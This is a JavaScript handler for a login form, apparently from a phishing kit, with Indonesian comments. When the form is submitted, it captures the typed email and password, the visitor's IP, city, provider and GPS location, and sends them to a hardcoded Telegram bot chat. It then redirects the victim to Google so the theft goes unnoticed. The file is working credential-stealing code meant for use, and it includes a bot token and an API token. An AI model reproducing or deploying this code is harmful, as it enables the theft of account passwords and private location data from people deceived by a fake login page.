document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Ambil email & password
    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    // Data bot Telegram
    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
    let chatIds = ["6786210993"]; // Bisa ditambah lebih dari satu ID
    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg";

    // Ambil informasi IP
    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    // Ambil lokasi pengguna
    async function getUserLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    () => {
                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
                    }
                );
            } else {
                resolve("📍 Lokasi: Tidak didukung di browser ini");
            }
        });
    }
    let lokasiUser = await getUserLocation();

    // Format pesan yang dikirim ke Telegram
    let message = `🔒 *Login Berhasil!*\n\n`
        + `🕒 *Waktu:* ${waktuLogin}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `🌍 *IP:* ${ipInfo.ip}\n`
        + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
        + `🏢 *Provider:* ${ipInfo.org}\n`
        + `${lokasiUser}`;

    // Kirim ke semua chat ID
    async function sendToAllChats(urlTemplate) {
        return Promise.all(chatIds.map(chatId => fetch(urlTemplate(chatId))));
    }

    await sendToAllChats(chatId =>
        `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`
    );

    await sendToAllChats(chatId =>
        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
    );

    console.log("✅ Semua data terkirim ke Telegram!");

    // Redirect ke Google setelah login
    window.location.href = "https://www.google.com";
});
